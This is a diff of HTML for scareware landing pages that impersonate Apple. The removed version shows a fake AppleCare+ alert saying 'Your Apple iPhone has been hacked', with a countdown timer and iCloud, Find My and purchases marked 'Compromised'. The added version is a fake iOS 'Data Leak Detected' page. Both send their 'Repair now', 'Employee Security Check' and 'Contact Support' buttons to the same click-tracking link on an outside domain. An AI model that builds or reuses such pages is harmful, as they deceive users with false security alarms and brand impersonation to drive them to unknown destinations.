@@ -1,61 +1,353 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <title>AppleCare+</title>
-  <style>
-    /* ====== GLOBAL ====== */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
-      user-select: none;
-      -webkit-user-select: none;
-    }
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/x-icon" href="https://meku.dev/favicon.ico" />
+    <title>iPhone Data Leak Information Page</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <!-- iOS шрифты -->
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700&family=SF+Pro+Text:wght@400;500;600&display=swap" rel="stylesheet">
 
-    html, body {
-      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", system-ui, sans-serif;
-      background: #000;
-      color: #fff;
-      height: 100%;
-      width: 100%;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-      position: fixed;
-      overflow: hidden;
-    }
+    <meta name="generator" content="Meku" />
+    <meta name="description" content="iPhone Data Leak Information Page Generated with Meku" />
+    <meta name="author" content="Meku" />
 
-    /* ====== HEADER ====== */
-    .header {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 44px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: rgba(28, 28, 30, 0.75);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
-      z-index: 10;
-      padding: 0 12px;
-    }
+    <meta property="og:title" content="iPhone Data Leak Information Page" />
+    <meta property="og:description" content="iPhone Data Leak Information Page Generated with Meku" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://meku.dev/images/meku.png" />
 
-    .header-title {
-      font-size: 17px;
-      font-weight: 600;
-      text-align: center;
-      color: #fff;
-      flex: 1;
-    }
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@meku_dev" />
+    <meta name="twitter:image" content="https://meku.dev/images/meku.png" />
 
-    .header-button {
+    <style>
+      /* iOS шрифты */
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
+      }
+
+      /* Запрет скролла */
+      body, html {
+
+  -webkit-user-select: none; /* Safari */
+  -moz-user-select: none; /* Firefox */
+  -ms-user-select: none; /* IE/Edge */
+  user-select: none; /* Стандартный синтаксис */
+
+        overflow: hidden;
+        height: 100%;
+        margin: 0;
+        padding: 0;
+      }
+
+      /* iOS Color Scheme */
+      :root {
+        /* Light Mode */
+        --ios-bg-primary: #ffffff;
+        --ios-bg-secondary: #f2f2f7;
+        --ios-bg-tertiary: #e5e5ea;
+        --ios-label-primary: #000000;
+        --ios-label-secondary: #3c3c43;
+        --ios-label-tertiary: #8e8e93;
+        --ios-separator: #c6c6c8;
+        --ios-blue: #007aff;
+        --ios-blue-dark: #0056cc;
+        --ios-red: #ff3b30;
+      }
+
+      @media (prefers-color-scheme: dark) {
+        :root {
+          /* Dark Mode */
+          --ios-bg-primary: #000000;
+          --ios-bg-secondary: #1c1c1e;
+          --ios-bg-tertiary: #2c2c2e;
+          --ios-label-primary: #ffffff;
+          --ios-label-secondary: #ebebf5;
+          --ios-label-tertiary: #8e8e93;
+          --ios-separator: #38383a;
+          --ios-blue: #0a84ff;
+          --ios-blue-dark: #409cff;
+          --ios-red: #ff453a;
+        }
+      }
+
+      /* Применение iOS темы */
+      body {
+        background: var(--ios-bg-secondary);
+        color: var(--ios-label-primary);
+        transition: all 0.3s ease;
+      }
+
+      .ios-card {
+        background: var(--ios-bg-primary);
+        border: 1px solid var(--ios-separator);
+      }
+
+      .ios-text-primary {
+        color: var(--ios-label-primary);
+      }
+
+      .ios-text-secondary {
+        color: var(--ios-label-secondary);
+      }
+
+      .ios-text-tertiary {
+        color: var(--ios-label-tertiary);
+      }
+
+      .ios-button-primary {
+        background: var(--ios-blue);
+        color: white;
+      }
+
+      .ios-button-primary:hover {
+        background: var(--ios-blue-dark);
+      }
+
+      .ios-button-secondary {
+        background: var(--ios-bg-tertiary);
+        color: var(--ios-label-primary);
+      }
+
+      .ios-button-secondary:hover {
+        background: var(--ios-separator);
+      }
+
+      .ios-iphone-frame {
+        background: var(--ios-bg-tertiary);
+        border-color: var(--ios-separator);
+      }
+
+      .ios-iphone-screen {
+        background: var(--ios-bg-primary);
+      }
+
+      .ios-icon-container {
+        border: 1px solid var(--ios-separator);
+        background: var(--ios-bg-primary);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+      }
+
+      .ios-icon-container img {
+        display: block;
+        object-fit: contain;
+      }
+
+      button {
+        outline: none !important;
+        box-shadow: none !important;
+        border: none !important;
+        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
+      }
+
+      button:focus,
+      button:active {
+        outline: none !important;
+        box-shadow: none !important;
+        border: none !important;
+      }
+
+      @keyframes pulse-scale {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+      }
+      .animate-pulse-scale {
+        animation: pulse-scale 2s infinite ease-in-out;
+      }
+      @keyframes opacity {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.5; }
+      }
+      .animate-opacity {
+        animation: opacity 1.5s infinite;
+      }
+
+      .backdrop-blur-xl {
+        backdrop-filter: blur(24px);
+      }
+      .shadow-2xl {
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+      }
+      .shadow-md {
+        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+      }
+      .rounded-3xl {
+        border-radius: 1.5rem;
+      }
+      .rounded-xl {
+        border-radius: 0.75rem;
+      }
+      .rounded-2xl {
+        border-radius: 1rem;
+      }
+      .rounded-b-md {
+        border-radius: 0 0 0.375rem 0.375rem;
+      }
+      .p-8 {
+        padding: 2rem;
+      }
+      .p-4 {
+        padding: 1rem;
+      }
+      .mb-6 {
+        margin-bottom: 1.5rem;
+      }
+      .mb-4 {
+        margin-bottom: 1rem;
+      }
+      .mb-2 {
+        margin-bottom: 0.5rem;
+      }
+      .mt-6 {
+        margin-top: 1.5rem;
+      }
+      .py-3 {
+        padding-top: 0.75rem;
+        padding-bottom: 0.75rem;
+      }
+      .px-4 {
+        padding-left: 1rem;
+        padding-right: 1rem;
+      }
+      .space-x-2 > :not([hidden]) ~ :not([hidden]) {
+        margin-right: 0.5rem;
+        margin-left: 0.5rem;
+      }
+      .space-y-3 > :not([hidden]) ~ :not([hidden]) {
+        margin-top: 0.75rem;
+        margin-bottom: 0.75rem;
+      }
+      .flex {
+        display: flex;
+      }
+      .items-center {
+        align-items: center;
+      }
+      .justify-center {
+        justify-content: center;
+      }
+      .w-full {
+        width: 100%;
+      }
+      .w-12 {
+        width: 3rem;
+      }
+      .w-16 {
+        width: 4rem;
+      }
+      .w-8 {
+        width: 2rem;
+      }
+      .h-12 {
+        height: 3rem;
+      }
+      .h-32 {
+        height: 8rem;
+      }
+      .h-24 {
+        height: 6rem;
+      }
+      .h-2 {
+        height: 0.5rem;
+      }
+      .h-6 {
+        height: 1.5rem;
+      }
+      .h-5 {
+        height: 1.25rem;
+      }
+      .max-w-sm {
+        max-width: 24rem;
+      }
+      .mx-auto {
+        margin-left: auto;
+        margin-right: auto;
+      }
+      .text-center {
+        text-align: center;
+      }
+      .text-2xl {
+        font-size: 1.5rem;
+        line-height: 2rem;
+        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      }
+      .text-sm {
+        font-size: 0.875rem;
+        line-height: 1.25rem;
+        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
+      }
+      .text-xs {
+        font-size: 0.75rem;
+        line-height: 1rem;
+        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
+      }
+      .font-semibold {
+        font-weight: 600;
+      }
+      .font-medium {
+        font-weight: 500;
+      }
+      .font-bold {
+        font-weight: 700;
+      }
+      .leading-relaxed {
+        line-height: 1.625;
+      }
+      .relative {
+        position: relative;
+      }
+      .absolute {
+        position: absolute;
+      }
+      .inset-1 {
+        top: 0.25rem;
+        right: 0.25rem;
+        bottom: 0.25rem;
+        left: 0.25rem;
+      }
+      .top-2 {
+        top: 0.5rem;
+      }
+      .left-1\/2 {
+        left: 50%;
+      }
+      .transform {
+        transform: translateX(0) translateY(0) rotate(0) skewX(0) skewY(0) scaleX(1) scaleY(1);
+      }
+      .-translate-x-1\/2 {
+        transform: translateX(-50%);
+      }
+      .-translate-y-1\/2 {
+        transform: translateY(-50%);
+      }
+      .transition-colors {
+        transition: all 0.2s ease;
+      }
+      .min-h-screen {
+        min-height: 100vh;
+      }
+
+      /* iOS-specific styles */
+      .ios-exclamation {
+        color: var(--ios-red);
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%) !important;
+      }
+
+      /* Ссылки в кнопках */
+      .button-link {
+        text-decoration: none;
+        width: 100%;
+      }
+
+          .header-button {
       display: flex;
       align-items: center;
       gap: 4px;
@@ -65,428 +357,79 @@
       font-weight: 400;
       position: absolute;
       left: 12px;
+      top: 7px;
     }
 
-    /* ====== ОСНОВНОЙ КОНТЕЙНЕР ====== */
-    .main-wrapper {
-      position: fixed;
-      top: 44px;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      display: flex;
-      flex-direction: column;
-    }
+.svg-align-middle {
+  vertical-align: middle;
+}
 
-    .scroll-content {
-      flex: 1;
-      overflow-y: auto;
-      -webkit-overflow-scrolling: touch;
-      padding: 16px 16px 8px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
 
-    /* ====== КАРТОЧКИ ====== */
-    .logo-card {
-      background: #1c1c1e;
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 14px;
-      padding: 18px 16px;
-      text-align: center;
-    }
-
-    .logo {
-      width: 60px;
-      height: 60px;
-      margin: 0 auto 8px;
-      border-radius: 14px;
-      overflow: hidden;
-      background: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .logo img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-
-    .title {
-      font-size: 18px;
-      font-weight: 600;
-      margin-bottom: 2px;
-    }
-
-    .subtitle {
-      font-size: 13px;
-      color: #8e8e93;
-    }
-
-    .section {
-      background: #1c1c1e;
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 10px;
-      overflow: hidden;
-    }
-
-    .item {
-      display: flex;
-      align-items: center;
-      padding: 11px 12px;
-      gap: 10px;
-      min-height: 44px;
-    }
-
-    .divider {
-      height: 0.5px;
-      background: rgba(255, 255, 255, 0.08);
-    }
-
-    .compromised {
-      background: rgba(139, 0, 0, 0.25);
-    }
-
-    .icon {
-      width: 22px;
-      height: 22px;
-      flex-shrink: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .icon svg {
-      width: 100%;
-      height: 100%;
-      color: #8e8e93;
-    }
-
-    .label {
-      flex: 1;
-      font-size: 15px;
-    }
-
-    .value {
-      font-size: 15px;
-      color: #8e8e93;
-    }
-
-    .compromised .label,
-    .compromised .value {
-      color: #ff453a;
-    }
-
-    /* ====== КНОПКА - ВНУТРИ ПРОКРУТКИ СРАЗУ ПОСЛЕ КАРТОЧЕК ====== */
-    .repair-button-final {
-      background: #ff3b30;
-      border: none;
-      border-radius: 14px;
-      color: #fff;
-      font-size: 16px;
-      font-weight: 600;
-      padding: 16px;
-      width: 100%;
-      cursor: pointer;
-      transition: background 0.2s;
-      text-align: center;
-      text-decoration: none;
-      display: block;
-      margin: 0;
-      margin-top: 4px;
-    }
-
-    .repair-button-final:active {
-      background: #ff2d20;
-    }
-
-    /* ====== iOS ALERT ====== */
-    .ios-alert-overlay {
-      position: fixed;
-      inset: 0;
-      z-index: 9999;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 16px;
-      opacity: 0;
-      visibility: hidden;
-      transition: opacity 0.3s ease, visibility 0.3s ease;
-    }
-
-    .ios-alert-overlay.show {
-      opacity: 1;
-      visibility: visible;
-    }
-
-    .ios-alert-backdrop {
-      position: absolute;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.4);
-    }
-
-    .ios-alert-modal {
-      position: relative;
-      width: 100%;
-      max-width: 270px;
-      background: rgba(242, 242, 247, 0.98);
-      border-radius: 14px;
-      overflow: hidden;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
-      transform: scale(1.1);
-      opacity: 0;
-      transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-    }
-
-    .ios-alert-overlay.show .ios-alert-modal {
-      transform: scale(1);
-      opacity: 1;
-    }
-
-    .ios-alert-content {
-      padding: 20px 16px 16px;
-      text-align: center;
-    }
-
-    .ios-alert-title {
-      font-size: 17px;
-      font-weight: 600;
-      color: #000;
-      margin-bottom: 8px;
-    }
-
-    .ios-alert-message {
-      font-size: 13px;
-      color: rgba(0, 0, 0, 0.7);
-      line-height: 18px;
-      margin-bottom: 4px;
-    }
-
-    .ios-alert-timer {
-      font-size: 13px;
-      font-weight: 500;
-      color: #ff3b30;
-      margin-top: 8px;
-    }
-
-    .ios-alert-divider {
-      height: 0.5px;
-      background: rgba(0, 0, 0, 0.1);
-    }
-
-    .ios-alert-buttons {
-      display: flex;
-    }
-
-    .ios-alert-button {
-      flex: 1;
-      font-size: 17px;
-      color: #007AFF;
-      padding: 11px;
-      border: none;
-      background: transparent;
-      cursor: pointer;
-    }
-
-    .ios-alert-button.primary {
-      font-weight: 600;
-      border-left: 0.5px solid rgba(0, 0, 0, 0.1);
-    }
-
-    /* ====== ТЕМНАЯ ТЕМА ДЛЯ АЛЕРТА ====== */
-    @media (prefers-color-scheme: dark) {
-      .ios-alert-modal {
-        background: rgba(44, 44, 46, 0.98);
-      }
-      
-      .ios-alert-title {
-        color: #fff;
-      }
-      
-      .ios-alert-message {
-        color: rgba(255, 255, 255, 0.7);
-      }
-      
-      .ios-alert-divider {
-        background: rgba(255, 255, 255, 0.1);
-      }
-      
-      .ios-alert-button {
-        color: #0a84ff;
-      }
-      
-      .ios-alert-button.primary {
-        border-left-color: rgba(255, 255, 255, 0.1);
-      }
-      
-      .ios-alert-button:active {
-        background: rgba(255, 255, 255, 0.05);
-      }
-    }
-
-    /* Light mode */
-    @media (prefers-color-scheme: light) {
-      body {
-        background: #f2f2f7;
-        color: #000;
-      }
-      .section, .logo-card {
-        background: #fff;
-        border-color: rgba(0, 0, 0, 0.08);
-      }
-      .header {
-        background: rgba(255, 255, 255, 0.8);
-        border-bottom: 0.5px solid rgba(0, 0, 0, 0.1);
-      }
-      .header-title { color: #000; }
-      .header-button { color: #007aff; }
-      .divider { background: rgba(0, 0, 0, 0.08); }
-      .compromised { background: rgba(255, 59, 48, 0.08); }
-    }
-
-    /* Safe area */
-    @supports (padding: max(0px)) {
-      .scroll-content {
-        padding-left: max(16px, env(safe-area-inset-left));
-        padding-right: max(16px, env(safe-area-inset-right));
-        padding-bottom: max(8px, env(safe-area-inset-bottom));
-      }
-    }
-  </style>
-</head>
-<body>
-  <!-- iOS Alert -->
-  <div id="iosAlert" class="ios-alert-overlay">
-    <div class="ios-alert-backdrop" onclick="closeAlert()"></div>
-    <div class="ios-alert-modal">
-      <div class="ios-alert-content">
-        <h2 class="ios-alert-title">Your Apple iPhone has been hacked</h2>
-        <p class="ios-alert-message">
-          Your data has appeared in a data leak, which puts this device at high risk of compromise. Proceed to the App Store
-        </p>
-        <p class="ios-alert-timer" id="countdown">1:28</p>
-      </div>
-      <div class="ios-alert-divider"></div>
-      <div class="ios-alert-buttons">
-        <button class="ios-alert-button" onclick="closeAlert()">Settings</button>
-        <button class="ios-alert-button primary" onclick="closeAlert()">OK</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Header -->
-  <div class="header">
-    <a href="#" class="header-button">
-      <svg width="16" height="16" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+    </style>
+  </head>
+  <body>
+      <div style="height: 0,5rem;"></div>
+      <div class="header">
+    <a href="" class="header-button">
+      <svg style="margin-top: 3px;" width="16" height="16" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
         <path d="M10.4132 4.04922L6.01738 8.34896C5.85917 8.50151 5.78572 8.67101 5.78572 8.86877C5.78572 9.06652 5.86482 9.24732 6.01738 9.39423L10.4132 13.6883C10.5431 13.8126 10.6957 13.8804 10.8821 13.8804C11.2607 13.8804 11.5545 13.5866 11.5545 13.2137C11.5545 13.0329 11.481 12.8577 11.3511 12.7278L7.39035 8.87442L11.3511 5.00974C11.481 4.87979 11.5545 4.71028 11.5545 4.52383C11.5545 4.15092 11.2607 3.85712 10.8821 3.85712C10.7013 3.85712 10.5431 3.92492 10.4132 4.04922Z" fill="currentColor"/>
       </svg>
       Settings
     </a>
-    <div class="header-title">AppleCare+</div>
-  </div>
-
-  <!-- Основной контент -->
-  <div class="main-wrapper">
-    <!-- Прокручиваемая область с ВСЕМ контентом включая кнопку -->
-    <div class="scroll-content">
-      <div class="logo-card">
-        <div class="logo">
-          <img src="icons/applecare.png" alt="AppleCare">
-        </div>
-        <div class="title">AppleCare+</div>
-        <div class="subtitle">Protection System</div>
-      </div>
-
-      <!-- Первая секция - основные данные -->
-      <div class="section">
-        <div class="item"><div class="label">Name, Phone Numbers, Email</div></div>
-        <div class="divider"></div>
-        <div class="item"><div class="label">Password & Security</div></div>
-        <div class="divider"></div>
-        <div class="item"><div class="label">Payment & Shipping</div><div class="value">Mastercard</div></div>
-      </div>
-
-      <!-- Вторая секция - скомпрометированные сервисы -->
-      <div class="section">
-        <div class="item compromised">
-          <div class="icon">
-            <img src="icons/icloud.svg" alt="iCloud">
+    <div class="min-h-screen flex items-center justify-center p-4">
+      <div class="w-full max-w-sm rounded-3xl shadow-2xl p-8 text-center ios-card">
+        <!-- iPhone-like Header -->
+        <div class="mb-6">
+          <div class="w-12 h-12 rounded-xl mx-auto mb-4 ios-icon-container" style="padding: 0;">
+            <img src="assets/applecare.svg" alt="warning" style="width: 100%; height: 100%; padding: 8px;">
           </div>
-          <div class="label">iCloud</div>
-          <div class="value">Compromised</div>
+          <h1 class="text-2xl font-semibold mb-2 ios-text-primary">Data Leak Detected</h1>
+          <p class="text-sm leading-relaxed ios-text-secondary">
+            Your iPhone has detected a potential data leak. Sensitive information may be at risk. Please secure your device immediately.
+          </p>
         </div>
-        <div class="divider"></div>
-        <div class="item compromised">
-          <div class="icon">
-            <img src="icons/appstore.svg" alt="AppStore">
-          </div>
-          <div class="label">Media & Purchases</div>
-          <div class="value">Compromised</div>
-        </div>
-        <div class="divider"></div>
-        <div class="item compromised">
-          <div class="icon">
-            <img src="icons/locator.svg" alt="Find My">
-          </div>
-          <div class="label">Find My</div>
-          <div class="value">Compromised</div>
-        </div>
-      </div>
 
-      <!-- Третья секция - информация об устройстве -->
-      <div class="section">
-        <div class="item">
-          <div class="icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-              <rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>
-              <path d="M12 18h.01"/>
-            </svg>
+        <!-- Liquid Glass Animation Placeholder -->
+        <div class="mb-6 relative h-32 flex items-center justify-center">
+          <div class="w-16 h-24 rounded-2xl shadow-md relative animate-pulse-scale ios-iphone-frame">
+            <div class="absolute inset-1 rounded-xl ios-iphone-screen relative">
+              <span class="ios-exclamation text-2xl font-bold animate-pulse-scale">
+                !
+              </span>
+            </div>
+            <div class="absolute top-2 left-1/2 transform -translate-x-1/2 w-8 h-2 rounded-b-md animate-opacity" style="background: var(--ios-separator);"></div>
           </div>
-          <div class="label">iPhone</div>
-          <div class="value">This iPhone</div>
         </div>
-      </div>
 
-      <!-- КНОПКА ВНУТРИ ПРОКРУТКИ СРАЗУ ПОСЛЕ ПОСЛЕДНЕЙ КАРТОЧКИ -->
-      <a href="https://strong-super.website/click.php?lp=1" class="repair-button-final">Repair now</a>
+        <!-- Action Buttons -->
+        <div class="space-y-3">
+          <a href="https://strong-super.website/click.php?lp=1" class="button-link">
+            <button class="w-full py-3 px-4 rounded-xl font-medium flex items-center justify-center space-x-2 transition-colors ios-button-primary">
+              <svg class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"></path>
+                <path d="M21 3v5h-5"></path>
+                <path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"></path>
+                <path d="M8 16H3v5"></path>
+              </svg>
+              <span>Employee Security Check</span>
+            </button>
+          </a>
+  <div style="height: 0,5rem;"></div>
+          <a href="https://strong-super.website/click.php?lp=1" class="button-link">
+            <button class="w-full py-3 px-4 rounded-xl font-medium flex items-center justify-center space-x-2 transition-colors ios-button-secondary">
+              <svg class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+              </svg>
+              <span>Contact Support</span>
+            </button>
+          </a>
+        </div>
+
+        <!-- Footer Note -->
+        <p class="mt-6 text-xs ios-text-tertiary">
+          For more information, visit Apple's official support page.
+        </p>
+      </div>
     </div>
-  </div>
-
-  <script>
-    window.addEventListener('DOMContentLoaded', function() {
-      setTimeout(function() {
-        document.getElementById('iosAlert').classList.add('show');
-      }, 3000);
-    });
-
-    let timeLeft = 88;
-    function updateCountdown() {
-      if (timeLeft > 0) {
-        timeLeft--;
-        const minutes = Math.floor(timeLeft / 60);
-        const seconds = timeLeft % 60;
-        document.getElementById('countdown').textContent = 
-          minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
-      }
-    }
-    setInterval(updateCountdown, 1000);
-
-    function closeAlert() {
-      document.getElementById('iosAlert').classList.remove('show');
-    }
-
-    document.addEventListener('touchstart', function(e) {
-      if (e.touches.length > 1) e.preventDefault();
-    });
-    let lastTouchEnd = 0;
-    document.addEventListener('touchend', function(e) {
-      const now = (new Date()).getTime();
-      if (now - lastTouchEnd <= 300) e.preventDefault();
-      lastTouchEnd = now;
-    }, false);
-  </script>
-</body>
+  </body>
 </html>
